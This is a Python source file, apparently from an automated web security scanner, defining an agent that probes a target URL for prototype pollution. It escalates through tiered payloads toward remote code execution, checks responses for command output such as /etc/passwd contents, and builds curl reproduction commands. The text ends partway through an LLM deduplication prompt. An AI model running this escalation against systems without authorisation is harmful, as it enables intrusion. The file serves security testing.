import asyncio
import aiohttp
import re
import json
import time
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bugtrace.agents.base import BaseAgent
from bugtrace.agents.worker_pool import WorkerPool, WorkerConfig
from bugtrace.core.job_manager import JobStatus
from bugtrace.core.ui import dashboard
from bugtrace.core.queue import queue_manager
from bugtrace.core.event_bus import EventType
from bugtrace.core.config import settings
from bugtrace.core.validation_status import ValidationStatus
from bugtrace.utils.logger import get_logger
from bugtrace.core.http_orchestrator import orchestrator, DestinationType
from bugtrace.core.verbose_events import create_emitter
from bugtrace.reporting.standards import (
    get_cwe_for_vuln,
    get_remediation_for_vuln,
    normalize_severity,
)
from bugtrace.agents.prototype_pollution_payloads import (
    POLLUTION_MARKER, VULNERABLE_PARAMS, get_query_param_payloads,
    BASIC_POLLUTION_PAYLOADS, ENCODING_BYPASSES, GADGET_CHAIN_PAYLOADS,
    RCE_GADGETS, PAYLOAD_TIERS, TIER_SEVERITY, get_payloads_for_tier
)

# v3.2.0: Import TechContextMixin for context-aware detection
from bugtrace.agents.mixins.tech_context import TechContextMixin

logger = get_logger("agents.prototype_pollution")


class PrototypePollutionAgent(BaseAgent, TechContextMixin):
    """
    Specialist Agent for Prototype Pollution vulnerabilities (CWE-1321).
    Target: Node.js APIs and frontend JavaScript with vulnerable merge/extend operations.

    Exploitation approach:
    - Hunter phase: Discover pollution vectors (query params, JSON body, frontend patterns)
    - Auditor phase: Validate pollution and escalate to RCE with tiered payloads
    """

    def __init__(self, url: str = "", params: List[str] = None, report_dir: Path = None, event_bus=None):
        super().__init__(
            name="PrototypePollutionAgent",
            role="Prototype Pollution Specialist",
            event_bus=event_bus,
            agent_id="prototype_pollution_specialist"
        )
        self.url = url
        self.params = params or []
        self.report_dir = report_dir or Path("./reports")
        self._tested_vectors = set()  # Deduplication
        self._client_side_pp_confirmed = False
        self._client_side_pp_url = ""

        # Queue consumption mode (Phase 20)
        self._queue_mode = False

        # Expert deduplication: Track emitted findings by fingerprint
        self._emitted_findings: set = set()  # Agent-specific fingerprint

        # WET → DRY transformation (Two-phase processing)
        self._dry_findings: List[Dict] = []  # Dedup'd findings after Phase A

        self._worker_pool: Optional[WorkerPool] = None
        self._scan_context: str = ""

        # v3.2.0: Context-aware tech stack (loaded in start_queue_consumer)
        self._tech_stack_context: Dict = {}
        self._prototype_pollution_prime_directive: str = ""

    # =========================================================================
    # FINDING VALIDATION: Prototype Pollution-specific validation (Phase 1 Refactor)
    # =========================================================================

    def _validate_before_emit(self, finding: Dict) -> Tuple[bool, str]:
        """
        Prototype Pollution-specific validation before emitting finding.

        Validates:
        1. Basic requirements (type, url) via parent
        2. Has pollution evidence (property set, RCE achieved)
        3. Payload contains prototype pollution patterns
        """
        # Call parent validation first
        is_valid, error = super()._validate_before_emit(finding)
        if not is_valid:
            return False, error

        # Extract from nested structure if needed
        nested = finding.get("finding", {})
        evidence = finding.get("evidence", nested.get("evidence", {}))
        status = finding.get("status", nested.get("status", ""))

        # PP-specific: Must have evidence or confirmed status
        if status not in ["VALIDATED_CONFIRMED", "PENDING_VALIDATION"]:
            has_pollution = evidence.get("pollution_confirmed") if isinstance(evidence, dict) else False
            has_rce = evidence.get("rce_achieved") if isinstance(evidence, dict) else False
            if not (has_pollution or has_rce):
                return False, "Prototype Pollution requires proof: pollution confirmed or RCE achieved"

        # PP-specific: Payload should contain prototype pollution patterns
        payload = finding.get("payload", nested.get("payload", ""))
        pp_markers = ['__proto__', 'constructor', 'prototype', '.polluted', 'toString']
        if payload and not any(m in str(payload) for m in pp_markers):
            return False, f"Prototype Pollution payload missing pollution patterns: {payload[:50]}"

        return True, ""

    def _emit_prototype_pollution_finding(self, finding_dict: Dict, scan_context: str = None) -> Optional[Dict]:
        """
        Helper to emit Prototype Pollution finding using BaseAgent.emit_finding() with validation.
        """
        if "type" not in finding_dict:
            finding_dict["type"] = "PROTOTYPE_POLLUTION"

        if scan_context:
            finding_dict["scan_context"] = scan_context

        finding_dict["agent"] = self.name
        return self.emit_finding(finding_dict)

    async def run_loop(self) -> Dict:
        """Main execution loop for Prototype Pollution testing."""
        dashboard.current_agent = self.name
        dashboard.log(f"[{self.name}] Starting Prototype Pollution analysis on {self.url}", "INFO")

        # Phase 1: Hunter - Discover pollution vectors
        vectors = await self._hunter_phase()

        if not vectors:
            dashboard.log(f"[{self.name}] No pollution vectors found", "INFO")
            return {
                "status": JobStatus.COMPLETED,
                "vulnerable": False,
                "findings": [],
                "findings_count": 0
            }

        # Phase 2: Auditor - Validate pollution and escalate to RCE
        findings = await self._auditor_phase(vectors)

        # Report findings
        for finding in findings:
            await self._create_finding(finding)

        return {
            "status": JobStatus.COMPLETED,
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "findings_count": len(findings)
        }

    async def _hunter_phase(self) -> List[Dict]:
        """
        Hunter Phase: Discover all potential prototype pollution vectors.

        Scans for:
        - Query parameters that match vulnerable patterns
        - JSON body acceptance (POST/PUT endpoints)
        - Existing parameters that suggest object merging
        - Response content indicating merge operations

        Returns:
            List of vectors with type, method, source, and confidence
        """
        dashboard.log(f"[{self.name}] Hunter: Scanning for pollution vectors", "INFO")

        # Early exit if no URL
        if not self.url:
            logger.warning(f"[{self.name}] No URL provided")
            return []

        vectors = []

        # 1. Check if endpoint accepts JSON body (most common vector)
        json_vector = await self._discover_json_body_vector()
        if json_vector:
            vectors.append(json_vector)

        # 2. Check existing query parameters for vulnerable names
        param_vectors = self._discover_param_vectors()
        vectors.extend(param_vectors)

        # 3. Check for query parameter pollution acceptance
        query_vectors = await self._discover_query_pollution_vectors()
        vectors.extend(query_vectors)

        # 4. Analyze response for vulnerable patterns
        content_vectors = await self._analyze_response_patterns()
        vectors.extend(content_vectors)

        # Deduplicate vectors by creating unique keys
        seen = set()
        unique_vectors = []
        for v in vectors:
            key = f"{v['type']}:{v.get('param', '')}:{v.get('pattern', '')}"
            if key not in seen:
                seen.add(key)
                unique_vectors.append(v)

        # Sort vectors by confidence (HIGH > MEDIUM > LOW)
        confidence_order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
        unique_vectors.sort(key=lambda v: confidence_order.get(v.get("confidence", "LOW"), 2))

        dashboard.log(f"[{self.name}] Hunter found {len(unique_vectors)} unique vectors", "INFO")
        return unique_vectors

    async def _discover_json_body_vector(self) -> Optional[Dict]:
        """
        Check if endpoint accepts JSON POST requests.

        Most prototype pollution occurs via JSON body, so this is priority check.
        """
        try:
            async with orchestrator.session(DestinationType.TARGET) as session:
                # Test with empty JSON object to check acceptance
                async with session.post(
                    self.url,
                    json={"test": "probe"},
                    headers={"Content-Type": "application/json"},
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as response:
                    # 415 = Unsupported Media Type (doesn't accept JSON)
                    # 405 = Method Not Allowed (doesn't accept POST)
                    if response.status not in (415, 405):
                        return {
                            "type": "JSON_BODY",
                            "method": "POST",
                            "source": "ENDPOINT_PROBE",
                            "confidence": "HIGH",
                            "status_code": response.status,
                        }

        except aiohttp.ClientError as e:
            logger.debug(f"[{self.name}] JSON body probe failed: {e}")
        except asyncio.TimeoutError:
            logger.debug(f"[{self.name}] JSON body probe timeout")

        return None

    def _discover_param_vectors(self) -> List[Dict]:
        """Discover pollution vectors in existing query parameters."""
        vectors = []
        parsed = urlparse(self.url)
        existing_params = parse_qs(parsed.query)

        # Check if any existing params match vulnerable patterns
        for param in existing_params.keys():
            param_lower = param.lower()

            # Check against known vulnerable parameter names
            if any(vuln_param in param_lower for vuln_param in VULNERABLE_PARAMS):
                vectors.append({
                    "type": "QUERY_PARAM",
                    "param": param,
                    "value": existing_params[param][0] if existing_params[param] else "",
                    "source": "URL_EXISTING",
                    "confidence": "MEDIUM",
                    "reason": "Parameter name suggests object merging",
                })

        # Also include params provided to agent
        if self.params:
            for param in self.params:
                if not any(v.get("param") == param for v in vectors):
                    vectors.append({
                        "type": "QUERY_PARAM",
                        "param": param,
                        "value": "",
                        "source": "AGENT_INPUT",
                        "confidence": "HIGH",
                    })

        return vectors

    async def _discover_query_pollution_vectors(self) -> List[Dict]:
        """
        Test if endpoint processes __proto__ in query parameters.

        Some endpoints parse query strings with vulnerable libraries (qs, querystring).
        """
        vectors = []

        try:
            async with orchestrator.session(DestinationType.TARGET) as session:
                # Test basic __proto__ query pollution
                test_url = f"{self.url}{'&' if '?' in self.url else '?'}__proto__[test]=probe"

                async with session.get(
                    test_url,
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as response:
                    # If we get a valid response (not 400 Bad Request), query parsing is happening
                    if response.status < 400:
                        vectors.append({
                            "type": "QUERY_PROTO",
                            "method": "GET",
                            "source": "QUERY_PROBE",
                            "confidence": "MEDIUM",
                            "test_url": test_url,
                        })

        except aiohttp.ClientError as e:
            logger.debug(f"[{self.name}] Query pollution probe failed: {e}")
        except asyncio.TimeoutError:
            logger.debug(f"[{self.name}] Query pollution probe timeout")

        return vectors

    async def _analyze_response_patterns(self) -> List[Dict]:
        """
        Analyze response content for vulnerable merge/extend patterns.

        Looks for:
        - JavaScript code with Object.assign, lodash.merge, $.extend
        - Error messages revealing merge operations
        - Response structure suggesting object manipulation
        """
        vectors = []

        try:
            async with orchestrator.session(DestinationType.TARGET) as session:
                async with session.get(
                    self.url,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    content = await response.text()
                    content_lower = content.lower()

                    # Check for vulnerable JavaScript patterns
                    js_patterns = [
                        ("object.assign", "Object.assign usage detected"),
                        ("lodash.merge", "Lodash merge detected"),
                        ("_.merge", "Lodash merge (underscore) detected"),
                        ("$.extend", "jQuery extend detected"),
                        ("deep-extend", "deep-extend package detected"),
                        ("merge-deep", "merge-deep package detected"),
                        ("deepmerge", "deepmerge package detected"),
                    ]

                    for pattern, reason in js_patterns:
                        if pattern in content_lower:
                            vectors.append({
                                "type": "JS_PATTERN",
                                "pattern": pattern,
                                "source": "RESPONSE_ANALYSIS",
                                "confidence": "LOW",
                                "reason": reason,
                            })
                            break  # One pattern is enough

                    # Check for server error messages that reveal merge operations
                    error_patterns = [
                        "cannot read property",
                        "undefined is not an object",
                        "cannot convert undefined",
                        "merge",
                        "deep copy",
                        "prototype",
                    ]

                    for pattern in error_patterns:
                        if pattern in content_lower:
                            vectors.append({
                                "type": "ERROR_PATTERN",
                                "pattern": pattern,
                                "source": "ERROR_MESSAGE",
                                "confidence": "LOW",
                                "reason": f"Error message suggests object manipulation: {pattern}",
                            })
                            break

        except aiohttp.ClientError as e:
            logger.debug(f"[{self.name}] Response analysis failed: {e}")
        except asyncio.TimeoutError:
            logger.debug(f"[{self.name}] Response analysis timeout")

        return vectors

    async def _test_hunter_phase(self) -> Dict:
        """
        Self-test method for Hunter phase verification.
        Uses httpbin.org which accepts JSON bodies.
        """
        test_results = {
            "json_body": False,
            "query_params": False,
            "response_analysis": False,
        }

        # Test JSON body detection
        json_vector = await self._discover_json_body_vector()
        test_results["json_body"] = json_vector is not None

        # Test param discovery
        param_vectors = self._discover_param_vectors()
        test_results["query_params"] = len(param_vectors) > 0

        # Test full hunter phase
        all_vectors = await self._hunter_phase()
        test_results["total_vectors"] = len(all_vectors)

        return test_results

    async def _auditor_phase(self, vectors: List[Dict]) -> List[Dict]:
        """
        Auditor Phase: Validate pollution vectors and escalate to RCE.

        Tests each vector with tiered payloads (stop on first success per tier):
        - Tier 1: Basic pollution detection (LOW severity)
        - Tier 2: Encoding bypasses (MEDIUM severity)
        - Tier 3: Gadget chain discovery (HIGH severity)
        - Tier 4: RCE exploitation (CRITICAL severity)

        Returns:
            List of confirmed findings with exploitation details
        """
        dashboard.log(f"[{self.name}] Auditor: Validating {len(vectors)} vectors", "INFO")
        findings = []

        for vector in vectors:
            # Skip already tested vectors (deduplication)
            key = f"{vector.get('type')}:{vector.get('param', '')}:{vector.get('method', '')}"
            if key in self._tested_vectors:
                continue
            self._tested_vectors.add(key)

            # Test based on vector type
            if vector["type"] == "JSON_BODY":
                result = await self._test_json_body_vector(vector)
            elif vector["type"] in ("QUERY_PARAM", "QUERY_PROTO"):
                result = await self._test_query_param_vector(vector)
            else:
                # JS_PATTERN and ERROR_PATTERN are informational
                continue

            if result and result.get("exploitable"):
                findings.append(result)
                severity = result.get("severity", "LOW")
                dashboard.log(
                    f"[{self.name}] CONFIRMED: {result.get('technique', 'unknown')} - {severity}",
                    "CRITICAL" if severity in ("CRITICAL", "HIGH") else "WARNING"
                )

                # Stop escalating this vector if RCE confirmed
                if result.get("rce_confirmed"):
                    dashboard.log(f"[{self.name}] RCE CONFIRMED - stopping escalation", "CRITICAL")

        return findings

    async def _test_json_body_vector(self, vector: Dict) -> Optional[Dict]:
        """
        Test JSON body vector with tiered payloads.

        Follows stop-on-first-success pattern within each tier,
        but continues to higher tiers for severity escalation.
        """
        best_result = None

        # Test each tier in order
        for tier in ["pollution_detection", "encoding_bypass", "gadget_chain", "rce_exploitation"]:
            payloads = get_payloads_for_tier(tier)

            for payload_info in payloads:
                if payload_info.get("method") not in ("JSON_BODY", None):
                    continue

                if hasattr(self, '_v'):
                    self._v.progress("exploit.specialist.progress", {"agent": "PrototypePollution", "tier": tier, "technique": payload_info.get("technique", "")}, every=50)

                result = await self._test_json_payload(payload_info, tier)

                if result and result.get("exploitable"):
                    # Keep highest severity result
                    if not best_result or self._severity_rank(result.get("severity")) > self._severity_rank(best_result.get("severity")):
                        best_result = result

                    # Stop this tier on first success
                    dashboard.log(f"[{self.name}] Tier {tier}: Success with {result.get('technique')}", "INFO")
                    break

            # If we found RCE, no need to continue
            if best_result and best_result.get("rce_confirmed"):
                break

        return best_result

    def _severity_rank(self, severity: str) -> int:
        """Convert severity to numeric rank for comparison."""
        ranks = {"LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}
        return ranks.get(severity, 0)

    async def _test_json_payload(self, payload_info: Dict, tier: str) -> Optional[Dict]:
        """Test a single JSON payload and check for pollution confirmation."""
        payload_obj = payload_info.get("payload", {})
        technique = payload_info.get("technique", "unknown")

        try:
            # Measure response time for timing attack detection
            start_time = time.time()

            async with orchestrator.session(DestinationType.TARGET) as session:
                async with session.post(
                    self.url,
                    json=payload_obj,
                    headers={"Content-Type": "application/json"},
                    timeout=aiohttp.ClientTimeout(total=15)  # Longer for RCE timing
                ) as response:
                    elapsed = time.time() - start_time
                    resp_text = await response.text()

                    # Check for pollution confirmation
                    pollution_confirmed = await self._verify_pollution(resp_text, POLLUTION_MARKER)

                    # Check for RCE timing attack success (sleep 5)
                    rce_timing = elapsed >= 4.5 and "rce_timing" in technique

                    # Check for RCE command output
                    rce_output = self._check_rce_output(resp_text)

                    if pollution_confirmed or rce_timing or rce_output:
                        severity = TIER_SEVERITY.get(tier, "LOW")
                        if rce_timing or rce_output:
                            severity = "CRITICAL"

                        return {
                            "exploitable": True,
                            "type": "PROTOTYPE_POLLUTION",
                            "method": "JSON_BODY",
                            "payload": json.dumps(payload_obj),
                            "payload_obj": payload_obj,
                            "technique": technique,
                            "tier": tier,
                            "severity": severity,
                            "pollution_confirmed": pollution_confirmed,
                            "rce_confirmed": rce_timing or rce_output,
                            "rce_evidence": {
                                "timing_delay": elapsed if rce_timing else None,
                                "command_output": rce_output,
                            } if (rce_timing or rce_output) else None,
                            "test_url": self.url,
                            "status_code": response.status,
                            "http_request": f"POST {self.url}\nContent-Type: application/json\n\n{json.dumps(payload_obj, indent=2)}",
                            "http_response": f"HTTP/1.1 {response.status}\n\n{resp_text[:500]}...",
                        }

        except aiohttp.ClientError as e:
            logger.debug(f"[{self.name}] JSON payload test failed: {e}")
        except asyncio.TimeoutError:
            # Timeout could indicate successful timing attack
            logger.debug(f"[{self.name}] Request timeout (potential timing attack)")
        except json.JSONDecodeError as e:
            logger.debug(f"[{self.name}] JSON decode error: {e}")

        return None

    async def _verify_pollution(self, response_text: str, marker: str) -> bool:
        """
        Verify pollution by checking if marker appears in response.

        Pollution is confirmed when:
        1. Marker appears in JSON response (inherited property)
        2. Response structure changes indicating pollution
        """
        # Direct marker check
        if marker in response_text:
            return True

        # Check for JSON response with polluted property
        try:
            resp_json = json.loads(response_text)
            if self._search_json_for_marker(resp_json, marker):
                return True
        except json.JSONDecodeError:
            pass

        return False

    def _search_json_for_marker(self, obj: Any, marker: str) -> bool:
        """Recursively search JSON object for pollution marker."""
        if isinstance(obj, str) and marker in obj:
            return True
        if isinstance(obj, dict):
            for key, value in obj.items():
                if marker in str(key) or self._search_json_for_marker(value, marker):
                    return True
        if isinstance(obj, list):
            for item in obj:
                if self._search_json_for_marker(item, marker):
                    return True
        return False

    def _check_rce_output(self, response_text: str) -> Optional[str]:
        """
        Check response for RCE command output indicators.

        Looks for:
        - whoami output (username patterns)
        - id output (uid/gid patterns)
        - cat /etc/passwd output (root:x:0 pattern)
        - hostname output
        """
        resp_lower = response_text.lower()

        # Check for common command outputs
        rce_indicators = [
            # whoami patterns
            (r'\b(root|admin|www-data|node|ubuntu|ec2-user|nobody)\b', "whoami_output"),
            # id command patterns
            (r'uid=\d+.*gid=\d+', "id_output"),
            # /etc/passwd patterns
            (r'root:x:0:0', "passwd_read"),
            # hostname output
            (r'hostname\s*[:=]\s*\S+', "hostname_output"),
        ]

        for pattern, indicator_type in rce_indicators:
            if re.search(pattern, response_text, re.IGNORECASE):
                # Extract the matched evidence
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    return f"{indicator_type}: {match.group(0)}"

        return None

    async def _test_query_param_vector(self, vector: Dict) -> Optional[Dict]:
        """Test query parameter vector with pollution payloads."""
        param = vector.get("param", "__proto__")
        query_payloads = get_query_param_payloads(POLLUTION_MARKER)

        for query in query_payloads:
            if hasattr(self, '_v'):
                self._v.progress("exploit.specialist.progress", {"agent": "PrototypePollution", "tier": "query_param", "payload": query[:60]}, every=50)

            test_url = f"{self.url}{'&' if '?' in self.url else '?'}{query}"

            try:
                async with orchestrator.session(DestinationType.TARGET) as session:
                    async with session.get(
                        test_url,
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as response:
                        resp_text = await response.text()

                        if await self._verify_pollution(resp_text, POLLUTION_MARKER):
                            return {
                                "exploitable": True,
                                "type": "PROTOTYPE_POLLUTION",
                                "method": "QUERY_PARAM",
                                "param": param,
                                "payload": query,
                                "technique": "query_pollution",
                                "tier": "pollution_detection",
                                "severity": "MEDIUM",  # Query param pollution is lower risk
                                "pollution_confirmed": True,
                                "rce_confirmed": False,
                                "test_url": test_url,
                                "status_code": response.status,
                                "http_request": f"GET {test_url}",
                                "http_response": f"HTTP/1.1 {response.status}\n\n{resp_text[:500]}...",
                            }

            except aiohttp.ClientError as e:
                logger.debug(f"[{self.name}] Query param test failed: {e}")
            except asyncio.TimeoutError:
                logger.debug(f"[{self.name}] Query param test timeout")

        return None

    async def _create_finding(self, result: Dict):
        """Reports a confirmed finding."""
        # Determine severity based on exploitation level
        severity = result.get("severity", "MEDIUM")
        if result.get("rce_confirmed"):
            severity = "CRITICAL"
        elif result.get("gadget_found"):
            severity = "HIGH"

        finding = {
            "type": "PROTOTYPE_POLLUTION",
            "severity": severity,
            "url": self.url,
            "parameter": result.get("param"),
            "payload": result.get("payload"),
            "description": f"Prototype Pollution via {result.get('method', 'unknown')} - {result.get('tier', 'basic')} exploitation",
            "validated": True,
            "status": "VALIDATED_CONFIRMED",
            "reproduction": self._build_reproduction(result),
            "cwe_id": get_cwe_for_vuln("PROTOTYPE_POLLUTION"),
            "remediation": get_remediation_for_vuln("PROTOTYPE_POLLUTION"),
            "cve_id": "N/A",
            "http_request": result.get("http_request", ""),
            "http_response": result.get("http_response", ""),
            "exploitation_tier": result.get("tier", "pollution_detection"),
            "rce_evidence": result.get("rce_evidence"),
        }
        logger.info(f"[{self.name}] PROTOTYPE POLLUTION CONFIRMED: {result.get('tier')} on {self.url}")

    def _build_reproduction(self, result: Dict) -> str:
        """Build curl command for reproducing the vulnerability."""
        method = result.get("method", "GET")
        if method == "JSON_BODY":
            payload_json = json.dumps(result.get("payload_obj", {}))
            return f"curl -X POST -H 'Content-Type: application/json' -d '{payload_json}' '{self.url}'"
        elif method == "QUERY_PARAM":
            return f"curl '{result.get('test_url', self.url)}'"
        return f"curl '{self.url}'"

    # ========================================
    # AUTONOMOUS PARAMETER DISCOVERY (v3.3 - Specialist Autonomy Pattern)
    # ========================================

    async def _discover_prototype_pollution_params(self, url: str) -> Dict[str, str]:
        """
        Prototype Pollution-focused parameter discovery for a given URL.

        Extracts ALL testable parameters from:
        1. URL query string
        2. HTML forms (input, textarea, select) - focus on object-like params
        3. Detects if endpoint accepts JSON POST bodies (most common PP vector)

        Prioritizes parameters with names suggesting object merging:
        - obj, data, options, config, params, settings, preferences
        - merge, extend, clone, copy, assign, update
        - __proto__, constructor, prototype (explicit pollution attempts)

        Returns:
            Dict mapping param names to default values
            Example: {"options": "{}", "config": "", "data": "{}"}
            Special key: "_accepts_json": True if endpoint accepts JSON POST

        Architecture Note:
            Specialists must be AUTONOMOUS - they discover their own attack surface.
            The finding from DASTySAST is just a "signal" that the URL is interesting.
            We IGNORE the specific parameter and test ALL discoverable params.
        """
        from bugtrace.tools.visual.browser import browser_manager
        from urllib.parse import urlparse, parse_qs
        from bs4 import BeautifulSoup

        all_params = {}

        # 1. Extract URL query parameters
        try:
            parsed = urlparse(url)
            url_params = parse_qs(parsed.query)
            for param_name, values in url_params.items():
                all_params[param_name] = values[0] if values else ""
        except Exception as e:
            logger.warning(f"[{self.name}] Failed to parse URL params: {e}")

        # 2. Fetch HTML and extract form parameters (focus on object-like params)
        try:
            state = await browser_manager.capture_state(url)
            html = state.get("html", "")

            if html:
                self._last_discovery_html = html  # Cache for URL resolution
                soup = BeautifulSoup(html, "html.parser")

                # Extract from <input>, <textarea>, <select> with name attribute
                for tag in soup.find_all(["input", "textarea", "select"]):
                    param_name = tag.get("name")
                    if param_name and param_name not in all_params:
                        # Exclude CSRF tokens and submit buttons
                        input_type = tag.get("type", "text").lower()
                        if input_type not in ["submit", "button", "reset"]:
                            if "csrf" not in param_name.lower() and "token" not in param_name.lower():
                                default_value = tag.get("value", "")
                                all_params[param_name] = default_value

                                # Flag high-priority PP params
                                param_lower = param_name.lower()
                                pp_keywords = [
                                    "obj", "data", "options", "config", "params", "settings",
                                    "preferences", "merge", "extend", "clone", "copy", "assign",
                                    "update", "proto", "constructor", "prototype"
                                ]
                                if any(keyword in param_lower for keyword in pp_keywords):
                                    logger.info(f"[{self.name}] 🎯 High-priority PP param found: {param_name}")

        except Exception as e:
            logger.error(f"[{self.name}] HTML parsing failed: {e}")

        # 3. Add common PP-relevant param names as synthetic candidates.
        # JS-only params (e.g., used in client-side deepMerge/$.extend) are invisible
        # to HTML form extraction. These common names appear frequently across web apps.
        pp_common_params = [
            "filter", "config", "options", "data", "settings", "params",
            "query", "json", "args", "obj", "merge", "extend", "input",
            "payload", "body", "attributes", "properties", "fields",
        ]
        for common_param in pp_common_params:
            if common_param not in all_params:
                all_params[common_param] = ""

        # 4. Check if endpoint accepts JSON POST bodies (MOST COMMON PP VECTOR)
        json_accepted = await self._probe_json_acceptance(url)
        if json_accepted:
            all_params["_accepts_json"] = "true"
            logger.info(f"[{self.name}] 🎯 Endpoint accepts JSON POST - PP prime target")

        logger.info(f"[{self.name}] 🔍 Discovered {len(all_params)} params on {url}: {list(all_params.keys())}")
        return all_params

    async def _probe_json_acceptance(self, url: str) -> bool:
        """
        Quick probe to check if endpoint accepts JSON POST requests.
        Returns True if JSON is accepted, False otherwise.
        """
        try:
            async with orchestrator.session(DestinationType.TARGET) as session:
                # Test with empty JSON object to check acceptance
                async with session.post(
                    url,
                    json={"test": "probe"},
                    headers={"Content-Type": "application/json"},
                    timeout=aiohttp.ClientTimeout(total=3)
                ) as response:
                    # 415 = Unsupported Media Type (doesn't accept JSON)
                    # 405 = Method Not Allowed (doesn't accept POST)
                    return response.status not in (415, 405)

        except (aiohttp.ClientError, asyncio.TimeoutError):
            return False

    # ========================================
    # WET → DRY Two-Phase Processing (Phase A: Deduplication, Phase B: Exploitation)
    # ========================================

    async def analyze_and_dedup_queue(self) -> List[Dict]:
        """
        PHASE A: Drain WET findings from queue and deduplicate using LLM + fingerprint fallback.

        NEW (v3.3 - Autonomous Discovery):
        - Expands each WET finding by discovering ALL params on the URL
        - Uses browser_manager to extract HTML form params
        - Creates separate WET items for each discovered param

        Returns:
            List of DRY (deduplicated) findings
        """
        import asyncio
        import time

        logger.info(f"[{self.name}] ===== PHASE A: Analyzing WET list =====")

        queue = queue_manager.get_queue("prototype_pollution")
        wet_findings = []

        # Wait for queue to have items (timeout 300s)
        wait_start = time.monotonic()
        while (time.monotonic() - wait_start) < 300.0:
            if queue.depth() if hasattr(queue, 'depth') else 0 > 0:
                break
            await asyncio.sleep(0.5)

        # Drain all WET findings from queue
        logger.info(f"[{self.name}] Phase A: Queue has {queue.depth() if hasattr(queue, 'depth') else 0} items, starting drain...")

        stable_empty_count = 0
        drain_start = time.monotonic()

        while stable_empty_count < 10 and (time.monotonic() - drain_start) < 300.0:
            item = await queue.dequeue(timeout=0.5)  # Use dequeue(), not get_nowait()

            if item is None:
                stable_empty_count += 1
                continue

            stable_empty_count = 0

            finding = item.get("finding", {}) if isinstance(item, dict) else {}
            if finding:
                wet_findings.append(finding)

        logger.info(f"[{self.name}] Phase A: Drained {len(wet_findings)} WET findings from queue")

        if not wet_findings:
            logger.info(f"[{self.name}] Phase A: No findings to process")
            return []

        # ========== AUTONOMOUS PARAMETER DISCOVERY (v3.3) ==========
        # Strategy: ALWAYS keep original WET params + ADD discovered params
        logger.info(f"[{self.name}] Phase A: Expanding WET findings with PP-focused discovery...")
        expanded_wet_findings = []
        seen_urls = set()
        seen_params = set()

        # 1. Always include ALL original WET params first (DASTySAST signals)
        for wet_item in wet_findings:
            url = wet_item.get("url", "")
            if not url:
                continue
            param = wet_item.get("parameter", "") or (wet_item.get("finding", {}) or {}).get("parameter", "")
            if param and (url, param) not in seen_params:
                seen_params.add((url, param))
                expanded_wet_findings.append(wet_item)

        # 2. Discover additional params per unique URL
        for wet_item in wet_findings:
            url = wet_item.get("url", "")
            if not url or url in seen_urls:
                continue
            seen_urls.add(url)

            try:
                all_params = await self._discover_prototype_pollution_params(url)
                if not all_params:
                    continue

                new_count = 0
                for param_name, param_value in all_params.items():
                    if (url, param_name) not in seen_params:
                        seen_params.add((url, param_name))
                        expanded_wet_findings.append({
                            "url": url,
                            "parameter": param_name,
                            "method": "POST" if all_params.get("_accepts_json") else "GET",
                            "context": wet_item.get("context", "unknown"),
                            "finding": wet_item.get("finding", {}),
                            "scan_context": wet_item.get("scan_context", self._scan_context),
                            "_discovered": True
                        })
                        new_count += 1

                if new_count:
                    logger.info(f"[{self.name}] 🔍 Discovered {new_count} additional params on {url}")

            except Exception as e:
                logger.error(f"[{self.name}] Discovery failed for {url}: {e}")

        # 2.5 Resolve endpoint URLs from HTML links/forms + reasoning fallback
        from bugtrace.agents.specialist_utils import resolve_param_endpoints, resolve_param_from_reasoning
        if hasattr(self, '_last_discovery_html') and self._last_discovery_html:
            for base_url in seen_urls:
                endpoint_map = resolve_param_endpoints(self._last_discovery_html, base_url)
                # Fallback: extract endpoints from DASTySAST reasoning text
                reasoning_map = resolve_param_from_reasoning(expanded_wet_findings, base_url)
                for k, v in reasoning_map.items():
                    if k not in endpoint_map:
                        endpoint_map[k] = v
                if endpoint_map:
                    resolved_count = 0
                    for item in expanded_wet_findings:
                        if item.get("url") == base_url:
                            param = item.get("parameter", "")
                            if param in endpoint_map and endpoint_map[param] != base_url:
                                item["url"] = endpoint_map[param]
                                resolved_count += 1
                    if resolved_count:
                        logger.info(f"[{self.name}] 🔗 Resolved {resolved_count} params to actual endpoint URLs")

        logger.info(f"[{self.name}] Phase A: Expanded {len(wet_findings)} hints → {len(expanded_wet_findings)} testable params")

        # LLM-powered deduplication on EXPANDED list
        dry_list = await self._llm_analyze_and_dedup(expanded_wet_findings, self._scan_context)

        # Store for later phases
        self._dry_findings = dry_list

        logger.info(f"[{self.name}] Phase A: Deduplication complete. {len(expanded_wet_findings)} WET → {len(dry_list)} DRY ({len(expanded_wet_findings) - len(dry_list)} duplicates removed)")

        return dry_list

    async def _llm_analyze_and_dedup(self, wet_findings: List[Dict], context: str) -> List[Dict]:
        """
        Use LLM to intelligently deduplicate Prototype Pollution findings.
        Falls back to fingerprint-based dedup if LLM fails.
        """
        from bugtrace.core.llm_client import llm_client

        # v3.2.0: Get tech context for context-aware deduplication
        tech_stack = getattr(self, '_tech_stack_context', {}) or {}
        prototype_pollution_prime_directive = getattr(self, '_prototype_pollution_prime_directive', '')
        prototype_pollution_dedup_context = self.generate_prototype_pollution_dedup_context(tech_stack)

        prompt = f"""You are analyzing {len(wet_findings)} potential Prototype Pollution findings.

{prototype_pollution_prime_directive}

{prototype_pollution_dedup_context}

DEDUPLICATION RULES FOR PROTOTYPE POLLUTION:

1. **CRITICAL - Autonomous Discovery:**
   - If items have "_discovered": true, they are DIFFERENT PARAMETERS discovered autonomously
   - Even if they share the same "finding" object, treat them as SEPARATE based on "parameter" field
   - Same URL + DIFFERENT param → DIFFERENT (keep all)
   - Same URL + param + DIFFERENT context → DIFFERENT (keep both)

2. **Standard Deduplication:**
   - Same endpoint + parameter + same method = DUPLICATE (keep only one)
   - Different endpoints = DIFFERENT vulnerabilities
   - Different parameters = DIFFERENT vulnerabilities
   - JSON body vs query param = DIFFERENT (different attack vectors)

3. **JavaScript-specific Context:**
   - Focus on Node.js APIs and frontend code
   - Prioritize params with PP-relevant names: merge, extend, options, config, settings, data

EXAMPLES:
